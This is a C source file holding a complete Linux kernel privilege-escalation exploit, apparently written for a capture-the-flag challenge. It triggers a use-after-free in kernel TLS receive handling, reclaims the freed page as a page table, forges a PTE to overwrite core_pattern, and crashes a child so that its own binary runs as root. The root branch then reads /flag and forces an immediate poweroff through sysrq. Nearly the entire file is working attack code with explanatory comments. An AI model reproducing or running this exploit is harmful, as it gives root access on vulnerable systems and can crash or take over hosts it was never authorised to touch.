#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/if_alg.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <err.h>
#include <linux/tls.h>


#define PAUSE           \
{                   \
	int x;          \
	printf(":");    \
	read(0, &x, 1); \
}

#define SYSCHK(x) ({              \
		typeof(x) __res = (x);        \
		if (__res == (typeof(x))-1)   \
		err(1, "SYSCHK(" #x ")"); \
		__res;                        \
		})

#define EXPLOIT_PORT 4444


void setup_cpu_affinity(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

void setup_tls(int sock) {
	struct tls12_crypto_info_aes_ccm_128 crypto = {0};
	crypto.info.version = TLS_1_2_VERSION;
	crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;
	SYSCHK(setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")));
	SYSCHK(setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto)));
}

void vuln_trigger_core_pattern(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}

int main(int argc, char** argv) {
	int listener, conn, client;
	static char buf[0x100000];
	static char *addrs[0x100];

	if (argc > 1)
	{

		// This section of code will be execute by root!
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag;sleep 1;echo o>/proc/sysrq-trigger");
		exit(0);
	}

	int sock = SYSCHK(socket(AF_ALG, SOCK_SEQPACKET, 0));
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type = "aead",
		.salg_name = "cryptd(ccm(aes))",
	};
	char *maddr = (void *)0x200000;
	// Loop mapped buffers with a 0x200000 (2MB PMD) stride instead of PAGE_SIZE.
	// This forces the kernel to allocate entirely new PTE page tables rather than
	// reusing existing ones, guaranteeing our spray hits fresh PTE pagetable objects.
	for (int i = 0; i < 0x100; i++)
		addrs[i] = SYSCHK(mmap(maddr + 0x200000 * i, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0));

	printf("bind %d\n",bind(sock, (struct sockaddr *)&sa, sizeof(sa)));
	struct sockaddr_in addr = {0};
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setup_cpu_affinity(0);

	// === Setup listener ===
	listener = socket(AF_INET, SOCK_STREAM, 0);
	if (listener < 0) { perror("socket listener"); exit(1); }

	addr.sin_family = AF_INET;
	addr.sin_port = htons(EXPLOIT_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (bind(listener, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("bind"); exit(1);
	}
	if (listen(listener, 1) < 0) {
		perror("listen"); exit(1);
	}

	// === Setup client and connect immediately ===
	client = socket(AF_INET, SOCK_STREAM, 0);
	if (client < 0) { perror("socket client"); exit(1); }

	if (connect(client, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("connect"); exit(1);
	}

	printf("[*] Client connected to server\n");

	// === Accept on server side (non-blocking because client already connected) ===
	conn = accept(listener, NULL, 0);
	if (conn < 0) {
		perror("accept"); exit(1);
	}
	printf("[*] Server accepted connection\n");
	int dummy_serv = socket(AF_INET, SOCK_STREAM, 0);
	connect(dummy_serv, (struct sockaddr *)&addr, sizeof(addr));
	// These dummy sockets are used to allocate and free an interleaving skb (B) during the UAF.
	// This prevents the slab allocator's fast-path double-free detection from noticing that
	// victim skb (A) was freed twice sequentially, creating an A -> B -> A free pattern.
	int dummy_cli = accept(listener, 0, 0);

	// === Setup TLS on both ends ===
	if(fork() == 0) {
		setup_cpu_affinity(0);
		int n = recv(conn, buf, 0x10000, MSG_WAITALL);
		printf("still read waitall? %d\n", n);
		exit(0);
	}

	// @sleep(desc="wait for child process to be ready at tcp_recvmsg")
	usleep(1000);
	setup_tls(conn);   // server end

	// This TLS 1.2 record was captured and statically embedded. It's constructed to 
	// have a specific length and padding to cleanly interact with tls_sw_recvmsg 
	// offset parsing.
	unsigned char tls_record[] = {
		0x17,                   // Content Type: Application Data (23)
		0x03, 0x03,             // Version: TLS 1.2 (0x0303)
		0x00, 0x23,             // Length: 35 bytes (0x0023)
		// --- Encrypted Payload begins here ---
		// Explicit IV (8 bytes for AES-CCM / GCM)
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		// Ciphertext Payload (11 bytes)
		0x00, 0x6e, 0xc7, 0x5f, 0xb2, 0xe2, 0xb4, 0x87, 0x46, 0x1e, 0xdd,
		// Authentication Tag / MAC (16 bytes for AES-CCM)
		0xcb, 0xc6, 0x92, 0xb4, 0x54, 0x7a, 0xae, 0xa5, 0x16, 0xe7, 0x7a, 0x2e, 0x5c, 0xd9, 0xac, 0x9a,
		// Extraneous byte potentially acting as a padding or alignment marker
		0x46
	};

	int pfd[2];
	pipe(pfd);

	int n = write(client, tls_record, sizeof(tls_record));
	printf("write %d\n", n);
	

	write(pfd[1],buf,0x800);
	n = splice(pfd[0],0,client,0,0x300,0);
	
	// Send 1 byte to dummy_cli. This allocates an skb (B) waiting to be read on dummy_serv.
	write(dummy_cli, buf, 1);

	printf("write %d\n", n);

	// This read-only mapping is passed to recv() to intentionally trigger an EFAULT 
	// during copy_to_user inside tls_sw_recvmsg. The fault aborts the receive operation early
	// but successfully populates rxm->full_len via tls_rx_rec_wait -> tls_strp_msg_load.
	// Without this, the kernel will crash at skb_to_sgvec because it calculates the length
	// as (rxm->full_len - prot->prepend_size). If rxm->full_len is 0, this causes an 
	// integer underflow (negative length), resulting in a panic.
	char* ro = SYSCHK(mmap(NULL, 0x100000, PROT_READ, MAP_SHARED|MAP_ANONYMOUS, -1, 0));

	n = recv(conn, ro, 0x100000, 0); // fill rxm->full_len by early return 
	printf("still read2? %d\n", n);
	wait(NULL); // child exit at this point
	// @sleep(desc="wait for child process cleanup before spraying")
	

	// Read the 1 byte sent from dummy_cli. This frees the interleaving skb (B),
	// completing the A -> B -> A free pattern to bypass fast-path double free detection.
	read(dummy_serv,buf,1); // prevent double free crash 

	read(pfd[0],buf,0x600); // free to pipe->tmp_page 

	n = recv(conn, buf, 0x100000, 0); // trigger page put

	write(pfd[1],buf,0x600); //get page from pipe->tmp_page 

	// touch addrs to allocate page tables
	int sum = 0;
	for (int i = 0; i < 0x100; i++)
		sum += addrs[i][0];
	(void)sum;

	read(pfd[0],buf,0x600); // read page, it should be pagetable and free to pipe->tmp_page  

	printf("pte? %zx\n", *(size_t*)buf);

#define ZERO_OFFSET 0x36ed000
#define CORE_PATTERN 0x2bbb340

	size_t pa = *(size_t *)&buf[0];
	pa &= 0xfffffffff000;
	pa += 0x867;
	pa -= ZERO_OFFSET;
	pa += (CORE_PATTERN & (~0xfff));
	int offset = CORE_PATTERN & (0xfff);

	// By writing to the pipe, the payload writes directly into the reclaimed kernel page (pagetable)
	// effectively injecting a fake PTE pointing to `core_pattern`.
	write(pfd[1], &pa, 8);
	for (int i = 0; i < 0x100; i++)
		strcpy(&addrs[i][offset], "|/proc/%P/fd/666 %P");

	if(fork()==0) {
		setsid();
		vuln_trigger_core_pattern("");
	}
	PAUSE;

	return 0;
}
